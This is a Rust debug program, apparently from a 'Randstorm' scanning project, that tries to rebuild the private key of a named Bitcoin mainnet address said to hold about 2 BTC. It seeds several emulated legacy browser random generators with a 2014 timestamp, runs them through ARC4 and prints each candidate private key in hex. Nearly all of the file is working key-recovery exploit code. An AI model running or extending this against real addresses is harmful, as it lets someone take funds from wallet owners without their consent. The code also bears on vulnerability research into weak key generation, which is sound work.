/// Debug tool to test Randstorm PRNG against known vulnerable address
///
/// Known test case:
/// Address: 1NUhcfvRthmvrHf1PAJKe5uEzBGK44ASBD
/// Timestamp: 1395038931000
/// Balance: 1.9999 BTC
use bitcoin::secp256k1::{Secp256k1, SecretKey};
use bitcoin::{Address, PublicKey};
use temporal_planetarium_lib::scans::randstorm::prng::bitcoinjs_v013::{Arc4, BitcoinJsV013Prng};
use temporal_planetarium_lib::scans::randstorm::prng::{PrngEngine, SeedComponents};

fn main() {
    println!("🔬 RANDSTORM PRNG DEBUG");
    println!("======================");
    println!();

    let timestamp = 1395038931000u64;
    let expected_address = "1NUhcfvRthmvrHf1PAJKe5uEzBGK44ASBD";

    println!("Known vulnerable address:");
    println!("  Timestamp: {}", timestamp);
    println!("  Expected:  {}", expected_address);
    println!();

    // Initialize PRNG with just timestamp (as BitcoinJS did)
    let prng = BitcoinJsV013Prng::new();
    let seed = SeedComponents {
        timestamp_ms: timestamp,
        user_agent: String::new(),
        screen_width: 0,
        screen_height: 0,
        color_depth: 0,
        timezone_offset: 0,
        language: String::new(),
        platform: String::new(),
    };

    println!("Generating private key from timestamp (current library impl)...");
    let state = prng.generate_state(&seed);
    let key_bytes = prng.generate_bytes(&state, 32);

    println!();
    println!("Generated private key (hex):");
    println!("  {}", hex::encode(&key_bytes));

    // Try to create Bitcoin address
    match SecretKey::from_slice(&key_bytes) {
        Ok(secret_key) => {
            let secp = Secp256k1::new();
            let secp_pubkey = bitcoin::secp256k1::PublicKey::from_secret_key(&secp, &secret_key);
            let public_key = PublicKey::new(secp_pubkey);

            // Generate P2PKH address
            let address = Address::p2pkh(public_key, bitcoin::Network::Bitcoin);

            println!();
            println!("Generated address:");
            println!("  Actual:   {}", address);
            println!("  Expected: {}", expected_address);
            println!();

            if address.to_string() == expected_address {
                println!("✅ SUCCESS! PRNG implementation is CORRECT!");
            } else {
                println!("❌ MISMATCH! PRNG implementation needs fixing!");
                println!();
                println!("Debug info:");
                println!("  Secret key: {}", hex::encode(secret_key.secret_bytes()));
                println!("  Public key: {}", public_key);
            }
        }
        Err(e) => {
            println!("❌ ERROR: Invalid private key generated: {}", e);
            println!("  This means the PRNG produced invalid secp256k1 key bytes");
        }
    }

    // Experimental RNG variants to align with historical Math.random()
    println!("\n--- Experimental RNG variants ---");
    let variants = [
        (
            "mwc1616_low_high32",
            derive_with_mwc as fn(u64) -> Option<DeriveResult>,
        ),
        ("drand48_48bit", derive_with_lcg48),
        ("xorshift128_split_ts", derive_with_xorshift128),
        ("drand48_srand_seed", derive_with_lcg48_srand),
        ("java_random_48bit", derive_with_java_random),
        ("mwc1616_no_timestamp_xor", derive_with_mwc_no_ts),
        ("mwc1616_low_high_swapped", derive_with_mwc_swapped),
    ];

    for (name, f) in variants {
        if let Some(addr_info) = f(timestamp) {
            println!("{} -> {}", name, addr_info.address);
            if addr_info.address == expected_address {
                println!("  ✅ matched expected address");
            }
            println!("  priv: {}", addr_info.priv_hex);
        } else {
            println!("{} -> invalid privkey", name);
        }
    }
}

struct DeriveResult {
    address: String,
    priv_hex: String,
}

fn derive_with_pool<F>(timestamp_ms: u64, mut next_u16: F) -> Option<DeriveResult>
where
    F: FnMut() -> u16,
{
    // Step 1: fill pool with Math.random() outputs (high byte then low byte)
    let mut pool = vec![0u8; 256];
    let mut ptr = 0usize;
    while ptr < 256 {
        let rand16 = next_u16();
        pool[ptr] = (rand16 >> 8) as u8;
        ptr += 1;
        if ptr < 256 {
            pool[ptr] = (rand16 & 0xFF) as u8;
            ptr += 1;
        }
    }

    finalize_pool(timestamp_ms, pool)
}

fn finalize_pool(timestamp_ms: u64, mut pool: Vec<u8>) -> Option<DeriveResult> {
    // seedTime (XOR low 32 bits of timestamp)
    let ts32 = timestamp_ms as u32;
    pool[0] ^= (ts32 & 0xFF) as u8;
    pool[1] ^= ((ts32 >> 8) & 0xFF) as u8;
    pool[2] ^= ((ts32 >> 16) & 0xFF) as u8;
    pool[3] ^= ((ts32 >> 24) & 0xFF) as u8;

    // ARC4
    let mut arc4 = Arc4::new(&pool);
    let mut priv_bytes = [0u8; 32];
    arc4.fill_bytes(&mut priv_bytes);

    let secp = Secp256k1::new();
    let secret_key = SecretKey::from_slice(&priv_bytes).ok()?;
    let secp_pubkey = bitcoin::secp256k1::PublicKey::from_secret_key(&secp, &secret_key);
    let public_key = PublicKey::new(secp_pubkey);
    let address = Address::p2pkh(public_key, bitcoin::Network::Bitcoin).to_string();

    Some(DeriveResult {
        address,
        priv_hex: hex::encode(priv_bytes),
    })
}

fn derive_with_mwc(timestamp_ms: u64) -> Option<DeriveResult> {
    let mut s1 = (timestamp_ms & 0xFFFF_FFFF) as u32;
    let mut s2 = (timestamp_ms >> 32) as u32;
    derive_with_pool(timestamp_ms, move || {
        s1 = 18_000_u32.wrapping_mul(s1 & 0xFFFF) + (s1 >> 16);
        s2 = 30_903_u32.wrapping_mul(s2 & 0xFFFF) + (s2 >> 16);
        ((((s1 as u64) << 16) + (s2 as u64)) >> 16) as u16
    })
}

fn derive_with_lcg48(timestamp_ms: u64) -> Option<DeriveResult> {
    let mut seed = timestamp_ms & ((1u64 << 48) - 1);
    derive_with_pool(timestamp_ms, move || {
        seed = (seed.wrapping_mul(25_214_903_917).wrapping_add(11)) & ((1u64 << 48) - 1);
        (seed >> 32) as u16
    })
}

fn derive_with_lcg48_srand(timestamp_ms: u64) -> Option<DeriveResult> {
    // Emulate srand48: internal state = (seed << 16) + 0x330E
    let mut seed = ((timestamp_ms & ((1u64 << 32) - 1)) << 16) + 0x330E;
    derive_with_pool(timestamp_ms, move || {
        seed = (seed.wrapping_mul(25_214_903_917).wrapping_add(11)) & ((1u64 << 48) - 1);
        (seed >> 32) as u16
    })
}

fn derive_with_java_random(timestamp_ms: u64) -> Option<DeriveResult> {
    // java.util.Random-style LCG with 48-bit state and xor scramble
    const MULT: u64 = 0x5DEECE66D;
    const ADD: u64 = 0xB;
    const MASK: u64 = (1u64 << 48) - 1;

    let mut seed = (timestamp_ms ^ MULT) & MASK;

    derive_with_pool(timestamp_ms, move || {
        // next(32)
        seed = (seed.wrapping_mul(MULT).wrapping_add(ADD)) & MASK;
        let high = seed >> 16;
        seed = (seed.wrapping_mul(MULT).wrapping_add(ADD)) & MASK;
        let low = seed >> 16;
        let bits26 = (high >> 6) & 0x3FFFFFF;
        let bits27 = low >> 5;
        let val = (bits26 << 27) | bits27; // 53 bits
        let rand = (val as f64) / ((1u64 << 53) as f64);
        (rand * 65536.0).floor() as u16
    })
}

fn derive_with_mwc_no_ts(timestamp_ms: u64) -> Option<DeriveResult> {
    let mut s1 = (timestamp_ms & 0xFFFF_FFFF) as u32;
    let mut s2 = (timestamp_ms >> 32) as u32;
    // Fill pool
    let mut pool = vec![0u8; 256];
    let mut ptr = 0usize;
    while ptr < 256 {
        s1 = 18_000_u32.wrapping_mul(s1 & 0xFFFF) + (s1 >> 16);
        s2 = 30_903_u32.wrapping_mul(s2 & 0xFFFF) + (s2 >> 16);
        let rand16 = ((((s1 as u64) << 16) + (s2 as u64)) >> 16) as u16;
        pool[ptr] = (rand16 >> 8) as u8;
        ptr += 1;
        if ptr < 256 {
            pool[ptr] = (rand16 & 0xFF) as u8;
            ptr += 1;
        }
    }
    finalize_pool(0, pool) // skip timestamp xor
}

fn derive_with_mwc_swapped(timestamp_ms: u64) -> Option<DeriveResult> {
    let mut s1 = (timestamp_ms & 0xFFFF_FFFF) as u32;
    let mut s2 = (timestamp_ms >> 32) as u32;
    // Fill pool with low byte then high byte (as in some debug scripts)
    let mut pool = vec![0u8; 256];
    let mut ptr = 0usize;
    while ptr < 256 {
        s1 = 18_000_u32.wrapping_mul(s1 & 0xFFFF) + (s1 >> 16);
        s2 = 30_903_u32.wrapping_mul(s2 & 0xFFFF) + (s2 >> 16);
        let rand16 = ((((s1 as u64) << 16) + (s2 as u64)) >> 16) as u16;
        pool[ptr] = (rand16 & 0xFF) as u8;
        ptr += 1;
        if ptr < 256 {
            pool[ptr] = (rand16 >> 8) as u8;
            ptr += 1;
        }
    }
    finalize_pool(timestamp_ms, pool)
}

fn derive_with_xorshift128(timestamp_ms: u64) -> Option<DeriveResult> {
    // Simple seeding: split timestamp into two u32s plus fixed constants
    let mut x = (timestamp_ms & 0xFFFF_FFFF) as u32;
    let mut y = ((timestamp_ms >> 32) & 0xFFFF_FFFF) as u32;
    let mut z = 521_288_629u32;
    let mut w = 886_751_23u32;

    derive_with_pool(timestamp_ms, move || {
        let t = x ^ (x << 11);
        x = y;
        y = z;
        z = w;
        w = w ^ (w >> 19) ^ (t ^ (t >> 8));
        (w >> 16) as u16
    })
}
